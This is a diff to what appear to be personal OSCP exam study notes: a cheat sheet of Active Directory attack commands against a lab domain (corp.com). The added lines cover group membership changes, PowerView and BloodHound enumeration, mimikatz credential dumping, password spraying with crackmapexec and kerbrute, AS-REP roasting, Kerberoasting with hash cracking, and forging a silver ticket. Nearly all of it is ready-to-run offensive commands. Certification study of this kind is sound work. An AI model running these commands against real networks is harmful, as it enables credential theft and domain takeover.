@@ -11,6 +11,12 @@ net user /domain
 net user jeffadmin /domain
 net group /domain
 net group "Management Department" /domain
+
+# add stephanie to management department
+net group "Management Department" stephanie /add /domain
+net group "Management Department" stephanie /del /domain
+
+
 ```
 
 **PowerView**
@@ -32,10 +38,102 @@ Get-NetComputer | select operatingsystem,dnshostname
 
 # fine possible local administrative access on computers
 Find-LocalAdminAccess
+
+# enumerate spn
+Get-NetUser -SPN | select samaccountname,serviceprincipalname
+
+# enumerate ACL: which SecurityIdentifier has which ActiveDirectoryRights
+Get-ObjectAcl -Identity stephanie
+Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
+
+# convert sid to name
+Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104
+
+# enumerate domain share: check SYSVOL to see if there's any policy "....xml"
+Find-DomainShare
+```
+
+**PsLoggedon.exe**
+```bash
+.\PsLoggedon.exe \\web04
+```
+
+**setspn**
+```bash
+setspn -L iis_service
+```
+
+**Bloodhound**
+```bash
+Import-Module .\Sharphound.ps1
+Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\TEMP\
 ```
 
 
+
 # Lateral Movement
+
+**Cached credentials**
+```bash
+# mimikatz
+privilege::debug
+sekurlsa::logonpasswords
+
+sekurlsa::tickets
+```
+
+**Password attacks**
+```bash
+# account policy
+net accounts
+
+# crackmapexec
+crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
+
+# kerbrute
+.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"
+```
+
+**AS-REP roasting**
+```bash
+# impacket-GetNPUser
+impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete
+
+# rubeus
+.\Rubeus.exe asreproast /nowrap
+
+# crack hash
+sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+```
+
+**Kerberoasting**
+```bash
+# impacket-GetUserSPNs
+sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
+
+# rebeus
+.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
+
+# crack hash
+sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+```
+
+**Silver ticket**
+![image](https://github.com/nuricheun/OSCP/assets/14031269/f699a792-5dbe-4804-bf52-977e0fee4888)
+![image](https://github.com/nuricheun/OSCP/assets/14031269/fd16d1df-f248-4256-9b33-2230470bcea4)
+```bash
+#Get domain SID
+whoami /user
+#IIS service ntlm from mimikatz or somewhere
+#mimikatz silver ticket attack
+kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
+iwr -UseDefaultCredentials http://web04
+
+# on kali machine
+ticketer.py -spn SPN -domain-sid DOMAIN SID -nthash NTLM -dc-ip IP_VICTIM -domain domain Administrator
+```
+
+
 **PSEXEC**
 ```bash
 psexec64.exe \\MACHINE_IP -u Administrator -p Mypass123 -i cmd.exe
